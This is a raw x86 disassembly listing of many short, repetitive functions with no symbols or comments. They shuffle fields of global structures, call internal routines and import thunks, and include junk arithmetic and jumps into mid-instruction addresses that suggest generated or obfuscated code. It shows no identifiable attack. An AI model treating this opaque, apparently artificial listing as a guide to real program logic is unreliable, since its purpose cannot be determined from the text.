  4d108e:	call   0x4d103c
  4d1093:	add    esp,0x4
  4d1096:	add    esp,0x5c
  4d1099:	pop    ebp
  4d109a:	ret    
  4d109b:	add    BYTE PTR [edi-0x1],bl
  4d109e:	adc    eax,0x4d2000
  4d10a3:	call   edi
  4d10a5:	add    BYTE PTR [eax],al
  4d10a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10ad:	sub    esp,0x44
  4d10b0:	mov    edx,0x4d30a8
  4d10b5:	cmp    edx,0x5154
  4d10bb:	je     0x4d10ab
  4d10bd:	push   edx
  4d10be:	push   0xfffffff4
  4d10c0:	call   0x4d103c
  4d10c5:	add    esp,0x4
  4d10c8:	pop    edx
  4d10c9:	push   edx
  4d10ca:	push   DWORD PTR [edx+0x10c]
  4d10d0:	push   DWORD PTR [edx+0xd8]
  4d10d6:	push   ebx
  4d10d7:	push   esi
  4d10d8:	call   0x4d0ffc
  4d10dd:	add    esp,0x10
  4d10e0:	pop    edx
  4d10e1:	push   edx
  4d10e2:	push   0x0
  4d10e4:	call   0x4d0dfc
  4d10e9:	add    esp,0x4
  4d10ec:	pop    edx
  4d10ed:	add    esp,0x44
  4d10f0:	pop    ebp
  4d10f1:	ret    
  4d10f2:	add    BYTE PTR [eax],al
  4d10f4:	mov    edi,edi
  4d10f6:	push   ebp
  4d10f7:	mov    ebp,esp
  4d10f9:	sub    esp,0x5c
  4d10fc:	lea    ecx,ds:0x4d3158
  4d1102:	add    DWORD PTR [ebp-0x24],0x27
  4d1106:	push   ecx
  4d1107:	push   edx
  4d1108:	push   DWORD PTR [ecx+0x134]
  4d110e:	push   DWORD PTR [ecx+0x11c]
  4d1114:	call   0x4d14e4
  4d1119:	add    esp,0xc
  4d111c:	pop    ecx
  4d111d:	push   ecx
  4d111e:	call   0x4d0be8
  4d1123:	add    esp,0x4
  4d1126:	pop    ecx
  4d1127:	push   ecx
  4d1128:	push   0x0
  4d112a:	call   0x4d0b88
  4d112f:	add    esp,0x4
  4d1132:	pop    ecx
  4d1133:	add    esp,0x5c
  4d1136:	pop    ebp
  4d1137:	ret    
  4d1138:	pop    edi
  4d1139:	call   DWORD PTR ds:0x4d2080
  4d113f:	call   edi
  4d1141:	add    BYTE PTR [eax],al
  4d1143:	add    BYTE PTR [edi-0x1],bl
  4d1146:	adc    eax,0x4d2024
  4d114b:	call   edi
  4d114d:	add    BYTE PTR [eax],al
  4d114f:	add    BYTE PTR [edi-0x1],bl
  4d1152:	adc    eax,0x4d2074
  4d1157:	call   edi
  4d1159:	add    BYTE PTR [eax],al
  4d115b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1161:	sub    esp,0x24
  4d1164:	mov    ebx,0x4d30cc
  4d1169:	cmp    ebx,0x7219
  4d116f:	je     0x4d115f
  4d1171:	push   ebx
  4d1172:	push   DWORD PTR [ebx+0xbc]
  4d1178:	push   DWORD PTR [ebx+0xc4]
  4d117e:	push   edi
  4d117f:	push   edx
  4d1180:	call   0x4d0954
  4d1185:	add    esp,0x10
  4d1188:	pop    ebx
  4d1189:	mov    edx,0x0
  4d118e:	push   edx
  4d118f:	call   0x4d0dfc
  4d1194:	add    esp,0x4
  4d1197:	mov    eax,0x0
  4d119c:	push   eax
  4d119d:	call   0x4d0d94
  4d11a2:	add    esp,0x4
  4d11a5:	add    esp,0x24
  4d11a8:	pop    ebp
  4d11a9:	ret    
  4d11aa:	add    BYTE PTR [eax],al
  4d11ac:	mov    edi,edi
  4d11ae:	push   ebp
  4d11af:	mov    ebp,esp
  4d11b1:	sub    esp,0x20
  4d11b4:	mov    edi,0x4d3028
  4d11b9:	add    DWORD PTR [edi+0x84],0xffffcd94
  4d11c3:	push   edi
  4d11c4:	push   DWORD PTR [edi+0xe8]
  4d11ca:	push   DWORD PTR [edi+0x128]
  4d11d0:	push   eax
  4d11d1:	call   0x4d1060
  4d11d6:	add    esp,0xc
  4d11d9:	pop    edi
  4d11da:	push   edi
  4d11db:	push   0x0
  4d11dd:	call   0x4d0b94
  4d11e2:	add    esp,0x4
  4d11e5:	pop    edi
  4d11e6:	push   edi
  4d11e7:	push   0x0
  4d11e9:	call   0x4d0ad4
  4d11ee:	add    esp,0x4
  4d11f1:	pop    edi
  4d11f2:	add    esp,0x20
  4d11f5:	pop    ebp
  4d11f6:	ret    
  4d11f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11fd:	sub    esp,0x3c
  4d1200:	lea    esi,ds:0x4d3074
  4d1206:	or     ebx,DWORD PTR [esi+0xf8]
  4d120c:	push   esi
  4d120d:	push   DWORD PTR [esi+0x2c]
  4d1210:	push   edi
  4d1211:	call   0x4d115c
  4d1216:	add    esp,0x8
  4d1219:	pop    esi
  4d121a:	mov    edi,0x0
  4d121f:	push   edi
  4d1220:	call   0x4d1048
  4d1225:	add    esp,0x4
  4d1228:	push   0x0
  4d122a:	call   0x4d0c50
  4d122f:	add    esp,0x4
  4d1232:	add    esp,0x3c
  4d1235:	pop    ebp
  4d1236:	ret    
  4d1237:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d123d:	sub    esp,0x28
  4d1240:	lea    ecx,ds:0x4d31c8
  4d1246:	sbb    edi,DWORD PTR [ecx-0x120]
  4d124c:	push   ecx
  4d124d:	call   0x4d0be8
  4d1252:	add    esp,0x4
  4d1255:	pop    ecx
  4d1256:	push   ecx
  4d1257:	push   DWORD PTR [ecx+0xf0]
  4d125d:	push   eax
  4d125e:	push   DWORD PTR [ecx+0xe0]
  4d1264:	push   edi
  4d1265:	call   0x4d0af8
  4d126a:	add    esp,0x10
  4d126d:	pop    ecx
  4d126e:	push   ecx
  4d126f:	push   0x0
  4d1271:	call   0x4d08f8
  4d1276:	add    esp,0x4
  4d1279:	pop    ecx
  4d127a:	add    esp,0x28
  4d127d:	pop    ebp
  4d127e:	ret    
  4d127f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1285:	sub    esp,0x30
  4d1288:	lea    edx,[edi-0x50]
  4d128b:	sbb    DWORD PTR [edx+0x17c],0xffffd1f8
  4d1295:	push   edx
  4d1296:	call   0x4d0990
  4d129b:	add    esp,0x4
  4d129e:	pop    edx
  4d129f:	push   edx
  4d12a0:	push   DWORD PTR [edx+0x1f4]
  4d12a6:	push   eax
  4d12a7:	push   edi
  4d12a8:	push   edi
  4d12a9:	call   0x4d13a4
  4d12ae:	add    esp,0x10
  4d12b1:	pop    edx
  4d12b2:	push   edx
  4d12b3:	call   0x4d0be8
  4d12b8:	add    esp,0x4
  4d12bb:	pop    edx
  4d12bc:	add    esp,0x30
  4d12bf:	pop    ebp
  4d12c0:	ret    
  4d12c1:	add    BYTE PTR [eax],al
  4d12c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12c9:	sub    esp,0x28
  4d12cc:	mov    esi,0x4d31cc
  4d12d1:	cmp    esi,0x3990
  4d12d7:	jb     0x4d12c7
  4d12d9:	push   esi
  4d12da:	push   eax
  4d12db:	push   DWORD PTR [esi+0x148]
  4d12e1:	push   edx
  4d12e2:	push   DWORD PTR [esi+0x1bc]
  4d12e8:	call   0x4d10a8
  4d12ed:	add    esp,0x10
  4d12f0:	pop    esi
  4d12f1:	push   0x0
  4d12f3:	call   0x4d0c50
  4d12f8:	add    esp,0x4
  4d12fb:	call   0x4d0be8
  4d1300:	add    esp,0x4
  4d1303:	add    esp,0x28
  4d1306:	pop    ebp
  4d1307:	ret    
  4d1308:	mov    edi,edi
  4d130a:	push   ebp
  4d130b:	mov    ebp,esp
  4d130d:	sub    esp,0x2c
  4d1310:	lea    edi,ds:0x4d3198
  4d1316:	adc    DWORD PTR [edi-0xf8],0xffffa4da
  4d1320:	push   edi
  4d1321:	push   edx
  4d1322:	push   edx
  4d1323:	call   0x4d0e60
  4d1328:	add    esp,0x8
  4d132b:	pop    edi
  4d132c:	push   edi
  4d132d:	mov    ecx,0x0
  4d1332:	push   ecx
  4d1333:	call   0x4d08f8
  4d1338:	add    esp,0x4
  4d133b:	pop    edi
  4d133c:	push   edi
  4d133d:	mov    edi,0x0
  4d1342:	push   edi
  4d1343:	call   0x4d08f8
  4d1348:	add    esp,0x4
  4d134b:	pop    edi
  4d134c:	add    esp,0x2c
  4d134f:	pop    ebp
  4d1350:	ret    
  4d1351:	add    BYTE PTR [eax],al
  4d1353:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1359:	sub    esp,0x38
  4d135c:	lea    edi,ds:0x4d31ac
  4d1362:	xor    ebx,0xffffdc8e
  4d1368:	push   edi
  4d1369:	push   0x0
  4d136b:	call   0x4d0c50
  4d1370:	add    esp,0x4
  4d1373:	pop    edi
  4d1374:	push   edi
  4d1375:	push   ebx
  4d1376:	push   eax
  4d1377:	push   edx
  4d1378:	push   DWORD PTR [edi+0x1c]
  4d137b:	call   0x4d0904
  4d1380:	add    esp,0x10
  4d1383:	pop    edi
  4d1384:	push   edi
  4d1385:	push   0xfffffff4
  4d1387:	call   0x4d103c
  4d138c:	add    esp,0x4
  4d138f:	pop    edi
  4d1390:	add    esp,0x38
  4d1393:	pop    ebp
  4d1394:	ret    
  4d1395:	add    BYTE PTR [eax],al
  4d1397:	add    BYTE PTR [edi-0x1],bl
  4d139a:	adc    eax,0x4d2020
  4d139f:	call   edi
  4d13a1:	add    BYTE PTR [eax],al
  4d13a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13a9:	sub    esp,0x44
  4d13ac:	mov    esi,0x4d30d8
  4d13b1:	sub    DWORD PTR [esi+0x104],0x5619
  4d13bb:	call   0x4d0be8
  4d13c0:	add    esp,0x4
  4d13c3:	push   esi
  4d13c4:	push   DWORD PTR [esi+0x1b0]
  4d13ca:	push   DWORD PTR [esi+0xa4]
  4d13d0:	push   ebx
  4d13d1:	call   0x4d07e8
  4d13d6:	add    esp,0xc
  4d13d9:	pop    esi
  4d13da:	mov    edx,0x0
  4d13df:	push   edx
  4d13e0:	call   0x4d08f8
  4d13e5:	add    esp,0x4
  4d13e8:	add    esp,0x44
  4d13eb:	pop    ebp
  4d13ec:	ret    
  4d13ed:	add    BYTE PTR [eax],al
  4d13ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13f5:	sub    esp,0x20
  4d13f8:	lea    edi,[ecx-0x48]
  4d13fb:	add    DWORD PTR [edi+0xcc],eax
  4d1401:	push   edi
  4d1402:	call   0x4d0be8
  4d1407:	add    esp,0x4
  4d140a:	pop    edi
  4d140b:	push   edi
  4d140c:	push   DWORD PTR [edi+0x58]
  4d140f:	push   DWORD PTR [edi+0x174]
  4d1415:	push   eax
  4d1416:	call   0x4d1280
  4d141b:	add    esp,0xc
  4d141e:	pop    edi
  4d141f:	push   edi
  4d1420:	push   0x0
  4d1422:	call   0x4d08f8
  4d1427:	add    esp,0x4
  4d142a:	pop    edi
  4d142b:	add    esp,0x20
  4d142e:	pop    ebp
  4d142f:	ret    
  4d1430:	mov    edi,edi
  4d1432:	push   ebp
  4d1433:	mov    ebp,esp
  4d1435:	sub    esp,0x34
  4d1438:	lea    ecx,ds:0x4d30c4
  4d143e:	and    ebx,DWORD PTR [ecx-0x28]
  4d1441:	push   ecx
  4d1442:	push   0xfffffff4
  4d1444:	call   0x4d103c
  4d1449:	add    esp,0x4
  4d144c:	pop    ecx
  4d144d:	push   ecx
  4d144e:	push   ebx
  4d144f:	push   DWORD PTR [ecx+0x198]
  4d1455:	push   DWORD PTR [ecx+0x5c]
  4d1458:	push   DWORD PTR [ecx+0x120]
  4d145e:	call   0x4d157c
  4d1463:	add    esp,0x10
  4d1466:	pop    ecx
  4d1467:	push   ecx
  4d1468:	mov    esi,0xfffffff4
  4d146d:	push   esi
  4d146e:	call   0x4d103c
  4d1473:	add    esp,0x4
  4d1476:	pop    ecx
  4d1477:	add    esp,0x34
  4d147a:	pop    ebp
  4d147b:	ret    
  4d147c:	pop    edi
  4d147d:	call   DWORD PTR ds:0x4d2070
  4d1483:	call   edi
  4d1485:	add    BYTE PTR [eax],al
  4d1487:	add    BYTE PTR [edi-0x1],bl
  4d148a:	adc    eax,0x4d2064
  4d148f:	call   edi
  4d1491:	add    BYTE PTR [eax],al
  4d1493:	add    BYTE PTR [edi-0x1],bl
  4d1496:	adc    eax,0x4d203c
  4d149b:	call   edi
  4d149d:	add    BYTE PTR [eax],al
  4d149f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a5:	sub    esp,0x38
  4d14a8:	mov    ecx,0x4d312c
  4d14ad:	adc    edx,ebx
  4d14af:	push   ecx
  4d14b0:	mov    eax,0x0
  4d14b5:	push   eax
  4d14b6:	call   0x4d109c
  4d14bb:	add    esp,0x4
  4d14be:	pop    ecx
  4d14bf:	push   ecx
  4d14c0:	push   esi
  4d14c1:	push   DWORD PTR [ecx+0x1c8]
  4d14c7:	push   edx
  4d14c8:	call   0x4d0fb0
  4d14cd:	add    esp,0xc
  4d14d0:	pop    ecx
  4d14d1:	push   ecx
  4d14d2:	push   0x0
  4d14d4:	call   0x4d0ff0
  4d14d9:	add    esp,0x4
  4d14dc:	pop    ecx
  4d14dd:	add    esp,0x38
  4d14e0:	pop    ebp
  4d14e1:	ret    
  4d14e2:	add    BYTE PTR [eax],al
  4d14e4:	mov    edi,edi
  4d14e6:	push   ebp
  4d14e7:	mov    ebp,esp
  4d14e9:	sub    esp,0x20
  4d14ec:	mov    eax,0x4d3048
  4d14f1:	mov    DWORD PTR [ebp-0x10],0x1a
  4d14f8:	push   eax
  4d14f9:	call   0x4d0be8
  4d14fe:	add    esp,0x4
  4d1501:	pop    eax
  4d1502:	push   eax
  4d1503:	push   DWORD PTR [eax+0x114]
  4d1509:	push   DWORD PTR [eax+0x7c]
  4d150c:	push   edx
  4d150d:	call   0x4d11f8
  4d1512:	add    esp,0xc
  4d1515:	pop    eax
  4d1516:	push   eax
  4d1517:	mov    eax,0x0
  4d151c:	push   eax
  4d151d:	call   0x4d0b88
  4d1522:	add    esp,0x4
  4d1525:	pop    eax
  4d1526:	add    esp,0x20
  4d1529:	pop    ebp
  4d152a:	ret    
  4d152b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1531:	sub    esp,0x4c
  4d1534:	lea    edx,[ecx+0x30]
  4d1537:	adc    DWORD PTR [ebp-0x20],0xffff8a0f
  4d153e:	push   edx
  4d153f:	push   DWORD PTR [edx+0x180]
  4d1545:	push   DWORD PTR [edx+0x18c]
  4d154b:	push   DWORD PTR [edx+0x11c]
  4d1551:	call   0x4d0c00
  4d1556:	add    esp,0xc
  4d1559:	pop    edx
  4d155a:	push   edx
  4d155b:	mov    ecx,0x0
  4d1560:	push   ecx
  4d1561:	call   0x4d0b94
  4d1566:	add    esp,0x4
  4d1569:	pop    edx
  4d156a:	push   edx
  4d156b:	call   0x4d0990
  4d1570:	add    esp,0x4
  4d1573:	pop    edx
  4d1574:	add    esp,0x4c
  4d1577:	pop    ebp
  4d1578:	ret    
  4d1579:	add    BYTE PTR [eax],al
  4d157b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1581:	sub    esp,0x24
  4d1584:	lea    esi,ds:0x4d31a0
  4d158a:	cmp    esi,0x1fd2
  4d1590:	jbe    0x4d157f
  4d1592:	push   esi
  4d1593:	push   DWORD PTR [esi+0x1cc]
  4d1599:	push   eax
  4d159a:	push   DWORD PTR [esi+0xc4]
  4d15a0:	call   0x4d08a0
  4d15a5:	add    esp,0xc
  4d15a8:	pop    esi
  4d15a9:	push   0x0
  4d15ab:	call   0x4d0dfc
  4d15b0:	add    esp,0x4
  4d15b3:	call   0x4d0990
  4d15b8:	add    esp,0x4
  4d15bb:	add    esp,0x24
  4d15be:	pop    ebp
  4d15bf:	ret    
  4d15c0:	mov    edi,edi
  4d15c2:	push   ebp
  4d15c3:	mov    ebp,esp
  4d15c5:	sub    esp,0x58
  4d15c8:	mov    edi,0x4d3050
  4d15cd:	adc    ebx,DWORD PTR [ebp-0x18]
  4d15d0:	push   edi
  4d15d1:	mov    esi,0x0
  4d15d6:	push   esi
  4d15d7:	call   0x4d0c50
  4d15dc:	add    esp,0x4
  4d15df:	pop    edi
  4d15e0:	push   edi
  4d15e1:	push   DWORD PTR [edi+0x7c]
  4d15e4:	push   ecx
  4d15e5:	push   DWORD PTR [edi+0x120]
  4d15eb:	push   DWORD PTR [edi+0x8c]
  4d15f1:	call   0x4d1238
  4d15f6:	add    esp,0x10
  4d15f9:	pop    edi
  4d15fa:	push   edi
  4d15fb:	mov    esi,0x0
  4d1600:	push   esi
  4d1601:	call   0x4d109c
  4d1606:	add    esp,0x4
  4d1609:	pop    edi
  4d160a:	add    esp,0x58
  4d160d:	pop    ebp
  4d160e:	ret    
	...
